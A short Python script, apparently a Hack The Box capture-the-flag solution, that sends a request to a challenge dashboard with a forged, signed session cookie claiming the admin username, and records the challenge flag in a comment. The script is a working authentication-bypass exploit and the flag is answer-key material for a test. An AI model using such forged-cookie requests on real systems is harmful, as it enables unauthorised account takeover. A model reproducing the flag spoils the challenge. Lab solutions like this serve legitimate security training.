import requests

cookie = {
	"session.sig" : "EYdvy2mhVoEznETyhYjNYFFZM8o",
	"session" : "eyJ1c2VybmFtZSI6ImFkbWluIn0="
}

res = requests.get("http://165.227.224.55:32306/dashboard",cookies=cookie)
print(res.text)
print(res.cookies)

# HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}